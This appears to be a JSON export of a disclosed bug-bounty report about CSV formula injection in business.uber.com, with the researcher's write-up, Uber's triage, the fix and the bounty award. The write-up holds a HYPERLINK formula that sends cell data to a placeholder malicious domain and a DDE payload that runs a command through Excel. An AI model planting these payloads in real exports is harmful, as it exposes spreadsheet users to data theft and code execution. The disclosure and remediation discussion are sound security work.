{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-03-30T19:11:28.880Z", 
    "voters": [
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 126109, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-04-06T21:27:50.723Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "CSV Injection in business.uber.com", 
    "is_member_of_team?": null, 
    "vote_count": 1, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 1785, 
            "content": "business.uber.com allows administrators to download CSVs containing a list of the users associated with their business. It is possible to inject formulas into the CSVs by starting names with `=`. ", 
            "content_html": "<p>business.uber.com allows administrators to download CSVs containing a list of the users associated with their business. It is possible to inject formulas into the CSVs by starting names with <code>=</code>. </p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-04-29T19:11:29.432Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/081/396/780650853ff426c966d80c5862584414831f137b/9goydGC.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225534Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e3d48f449a6188aed1c8a04923dc26fb3462d15db32a7a6b5d920f71dbf8cb64", 
                    "type": "image/png", 
                    "id": 81396, 
                    "filename": "9goydGC.png"
                }, 
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/081/397/675a3519162275f4fbe6d66e6967e226e4e7c94d/5eIvz1h.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSGAJTS7X%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225534Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDNv1JJkb2JCBJezLRSK3A3HLsRbM1N2dJQCs3cdkO9DdSlu97QyvuTWjB9TDM0zF0K5xYiGpDCZFKPrax%2BsFz5KI1WenrJdfAQhjK2VjV8ng750HOo6R9QtyoSkXqJSITk3z0sX6u%2BaGuR53DR1SgrXgU4%2BZj3kzVsOKKtd61G%2BDZP2N3q%2FR9lSxtCBWOIkOltAHyGZcqelOD%2BNHIXr08GPe3urs8MfpCWN12Uc98ELvbzHllGEdfFgQzzzB%2Fh03QvsfmUHldJCz%2F09ZO2mOXeVGvvhGa6P439ow0kmfHorCf2l49cQlp550RAVCceslQNRsIpjs%2FscvNzwUdv1wSWwe0IojrRDLG4nQFwiQ1K3a1GlpxXYzTv176jcnZhJdyzHXn0aNVd3n2yu6QXF1RyrednAqH6GTeLsY%2BmFdJvs1E%2FSPzNOEj5naR190ChZbKYdPEncIwhYy7S7R055CIUnAzUObhGpKBIz%2FL7hX57SOAVB8Fp6J9NWYxxkcT1Ux5M8TRdPzjlD4gsEW3VAWt2ylLrHUu11rkw%2BhgkA7Cbe4vsOk6sYBm%2BDSV9vvQVz42kWGtRMos%2BFMKzKt4FX3akfBm1nwEgIo656m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=76db0216d83229c400465f7a3417ff5dbbcd345e80db8c276a7eda1e9e45acf3", 
                    "type": "image/png", 
                    "id": 81397, 
                    "filename": "5eIvz1h.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-03-26T03:05:05.213Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-26T03:05:05.213Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "If you would like to see the two prompts that Excel pops up before executing an external program, I attached screenshots. ", 
            "markdown_message": "<p>If you would like to see the two prompts that Excel pops up before executing an external program, I attached screenshots. </p>\n", 
            "type": "Activities::Comment", 
            "id": 872011, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-28T20:04:56.125Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-28T20:04:56.125Z", 
            "actor": {
                "username": "jmilne-uber", 
                "url": "/jmilne-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/902/f369ee534bf8afc43b413508f45c37249b00ce46_medium.jpg?1447796372"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @ddworken, thanks for another great report!\n\nGiven that expressions like this are a non-standard extension to the CSV specification, do you have any thoughts on how escaping should be done? \n\nA quick google suggests [prefixing the column contents with an apostrophe when they start with =](http://www.contextis.com/resources/blog/comma-separated-vulnerabilities/) (presumably because `'` is a comment character in VBA?) but this might cause issues with non-Excel consumers of the CSV which _do not_ ignore apostrophes. Legitimate occurrences of columns beginning with literal `=`s might be rare enough that we'd still go with the apostrophe prefix, however.", 
            "markdown_message": "<p>Hey <a href=\"/ddworken\">@ddworken</a>, thanks for another great report!</p>\n\n<p>Given that expressions like this are a non-standard extension to the CSV specification, do you have any thoughts on how escaping should be done? </p>\n\n<p>A quick google suggests <a href=\"/redirect?signature=e2bcc942c878da8c06e81c1580f79f7a4a157d7b&amp;url=http%3A%2F%2Fwww.contextis.com%2Fresources%2Fblog%2Fcomma-separated-vulnerabilities%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>prefixing the column contents with an apostrophe when they start with =</span><i class=\"icon-external-link\"></i></a> (presumably because <code>&#39;</code> is a comment character in VBA?) but this might cause issues with non-Excel consumers of the CSV which <u>do not</u> ignore apostrophes. Legitimate occurrences of columns beginning with literal <code>=</code>s might be rare enough that we&#39;d still go with the apostrophe prefix, however.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 875182, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-28T20:39:41.364Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-28T20:39:41.364Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Yeah, this is kind of a difficult thing to patch. Adding an apostrophe before an ```=``` alone isn't quite sufficient to patch it, you also have to do the same before ```+``` and ```-``` (only when they are at the start of the field though). At least that is how [HackerOne fixed it](https://hackerone.com/reports/72785) when they had a similar problem. \n\nGoogle Sheets also ignores apostrophes (though LibreOffice and OpenOffice do not). \n\nUltimately I don't think ```=```, ```+```, ```-```s are common at in the beginning of a field so it probably is fine to escape them with a ```'``` when at the start of a field. ", 
            "markdown_message": "<p>Yeah, this is kind of a difficult thing to patch. Adding an apostrophe before an <code>=</code> alone isn&#39;t quite sufficient to patch it, you also have to do the same before <code>+</code> and <code>-</code> (only when they are at the start of the field though). At least that is how <a href=\"https://hackerone.com/reports/72785\">HackerOne fixed it</a> when they had a similar problem. </p>\n\n<p>Google Sheets also ignores apostrophes (though LibreOffice and OpenOffice do not). </p>\n\n<p>Ultimately I don&#39;t think <code>=</code>, <code>+</code>, <code>-</code>s are common at in the beginning of a field so it probably is fine to escape them with a <code>&#39;</code> when at the start of a field. </p>\n", 
            "type": "Activities::Comment", 
            "id": 875255, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-28T20:46:39.961Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-28T20:46:39.961Z", 
            "actor": {
                "username": "jmilne-uber", 
                "url": "/jmilne-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/902/f369ee534bf8afc43b413508f45c37249b00ce46_medium.jpg?1447796372"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Awesome, thanks for the additional context! I've triaged this issue internally, along with your advice on how to remediate the issue. I'll add an update to this report when there's progress.", 
            "markdown_message": "<p>Awesome, thanks for the additional context! I&#39;ve triaged this issue internally, along with your advice on how to remediate the issue. I&#39;ll add an update to this report when there&#39;s progress.</p>\n", 
            "type": "Activities::Comment", 
            "id": 875275, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-28T20:55:17.017Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-28T20:55:17.017Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Great! Thank you very much. ", 
            "markdown_message": "<p>Great! Thank you very much. </p>\n", 
            "type": "Activities::Comment", 
            "id": 875297, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-30T19:01:40.600Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-30T19:01:40.600Z", 
            "actor": {
                "username": "jmilne-uber", 
                "url": "/jmilne-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/902/f369ee534bf8afc43b413508f45c37249b00ce46_medium.jpg?1447796372"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "The engineers working on `business.uber.com` say that they've pushed a fix for this. Are columns starting with `=`, `+` and `-` escaped with a `'` for you now?", 
            "markdown_message": "<p>The engineers working on <code>business.uber.com</code> say that they&#39;ve pushed a fix for this. Are columns starting with <code>=</code>, <code>+</code> and <code>-</code> escaped with a <code>&#39;</code> for you now?</p>\n", 
            "type": "Activities::Comment", 
            "id": 878549, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-30T19:06:47.564Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-30T19:06:47.564Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Yup, that fixed it. \n\nThanks,\nDavid Dworken", 
            "markdown_message": "<p>Yup, that fixed it. </p>\n\n<p>Thanks,<br>\nDavid Dworken</p>\n", 
            "type": "Activities::Comment", 
            "id": 878573, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ddworken", 
                "url": "/ddworken"
            }, 
            "created_at": "2016-03-30T19:08:26.736Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-30T19:08:26.736Z", 
            "actor": {
                "username": "jmilne-uber", 
                "url": "/jmilne-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/902/f369ee534bf8afc43b413508f45c37249b00ce46_medium.jpg?1447796372"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Rad, thanks again!", 
            "markdown_message": "<p>Rad, thanks again!</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 878586, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-03-30T19:11:28.903Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-03-30T19:11:28.903Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 878600, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-04-06T21:27:20.208Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-06T21:27:20.208Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "ddworken", 
                "url": "/ddworken"
            }, 
            "message": "Nice work, thanks for an awesome bug!\n\nAs you mentioned, the scope of the issue is mitigated by the fact that this can only be used by an admin of the organization on another admin of the *same* organization, and the user must specifically click past a security warning when `=cmd` is used. \n\nWith that in mind, we've decided to award this a $1000 bounty.", 
            "markdown_message": "<p>Nice work, thanks for an awesome bug!</p>\n\n<p>As you mentioned, the scope of the issue is mitigated by the fact that this can only be used by an admin of the organization on another admin of the <em>same</em> organization, and the user must specifically click past a security warning when <code>=cmd</code> is used. </p>\n\n<p>With that in mind, we&#39;ve decided to award this a $1000 bounty.</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 892745, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-06T21:27:50.929Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-06T21:27:50.929Z", 
            "actor": {
                "username": "jmilne-uber", 
                "url": "/jmilne-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/902/f369ee534bf8afc43b413508f45c37249b00ce46_medium.jpg?1447796372"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 892747, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-06T21:27:56.884Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-06T21:27:56.884Z", 
            "actor": {
                "username": "jmilne-uber", 
                "url": "/jmilne-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/902/f369ee534bf8afc43b413508f45c37249b00ce46_medium.jpg?1447796372"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 892748, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-06T21:31:52.688Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-06T21:31:52.688Z", 
            "actor": {
                "username": "ddworken", 
                "url": "/ddworken", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/344/221b5d357fc59c63987d2ed60b7d586df065f92e_medium.png?1424388672"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Great! Thank you very much for the bounty and the quick response time!\n\nThanks,\nDavid Dworken", 
            "markdown_message": "<p>Great! Thank you very much for the bounty and the quick response time!</p>\n\n<p>Thanks,<br>\nDavid Dworken</p>\n", 
            "type": "Activities::Comment", 
            "id": 892756, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ddworken", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ddworken", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/017/344/b5a8712fba49a7d64be9cd1b3d0b50d4076edb42_small.png?1424388672"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 18, 
        "name": "Information Disclosure"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -82179845.28120917, 
    "disclosed_at": "2016-04-06T21:27:51.334Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/126109", 
    "created_at": "2016-03-26T02:59:24.520Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>business.uber.com allows for names to begin with an <code>=</code> which allows for injection of formulas into the downloaded CSVs. I wasn&#39;t quite sure what to categorize this as since there are two main problems with allowing injection of formulas into a CSV: </p>\n\n<ol>\n<li>It allows for data exfiltration through HYPERLINKs</li>\n<li>It allows for code execution on the user&#39;s machine provided that they trust Uber</li>\n</ol>\n\n<p>1 can be done by setting one&#39;s username to something of the form:  <code>&quot;=HYPERLINK(&quot;https://maliciousDomain.com/evil.html?data=&quot;&amp;A1, &quot;Click to view additional information&quot;)&quot;</code>. This will create a cell that will show the text &quot;Click to view additional information&quot; but when clicked will send the data in A1 to <code>maliciousDomain.com</code>. </p>\n\n<p>2 can be done by setting one&#39;s username to something of the form: <code>=cmd|&#39; /C calc&#39;!A0</code> (this will open Windows calculator). If a CSV contains a command like the above, excel will warn the user with two different pop up boxes. The problem is that these boxes ask the user whether they &quot;trust the source of&quot; the file. Since most users will trust Uber as a source, they will click through this without worry. </p>\n\n<p>While it is true that one needs to be an admin on the business page in order to change the username, this still qualifies as a vulnerability (and not simply a self-CSV-injection) since there can be multiple admins. This allows for one admin to get code execution on another admin&#39;s computer through the download CSV function. </p>\n\n<p>One final note, the function to download a CSV of all trips is also likely vulnerable to this but I have not tested it since I have not had a chance to take an Uber on my business account. </p>\n\n<p>Thanks,<br>\nDavid Dworken</p>\n", 
    "vulnerability_information": "business.uber.com allows for names to begin with an ```=``` which allows for injection of formulas into the downloaded CSVs. I wasn't quite sure what to categorize this as since there are two main problems with allowing injection of formulas into a CSV: \n\n1. It allows for data exfiltration through HYPERLINKs\n2. It allows for code execution on the user's machine provided that they trust Uber\n\n1 can be done by setting one's username to something of the form:  ```\"=HYPERLINK(\"https://maliciousDomain.com/evil.html?data=\"&A1, \"Click to view additional information\")\"```. This will create a cell that will show the text \"Click to view additional information\" but when clicked will send the data in A1 to ```maliciousDomain.com```. \n\n2 can be done by setting one's username to something of the form: ```=cmd|' /C calc'!A0``` (this will open Windows calculator). If a CSV contains a command like the above, excel will warn the user with two different pop up boxes. The problem is that these boxes ask the user whether they \"trust the source of\" the file. Since most users will trust Uber as a source, they will click through this without worry. \n\nWhile it is true that one needs to be an admin on the business page in order to change the username, this still qualifies as a vulnerability (and not simply a self-CSV-injection) since there can be multiple admins. This allows for one admin to get code execution on another admin's computer through the download CSV function. \n\nOne final note, the function to download a CSV of all trips is also likely vulnerable to this but I have not tested it since I have not had a chance to take an Uber on my business account. \n\nThanks,\nDavid Dworken", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.uber.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Uber"
        }, 
        "handle": "uber", 
        "url": "https://hackerone.com/uber", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/314/826c90cba1555458df787ae914793cd5070e18df_small.png?1514905146", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}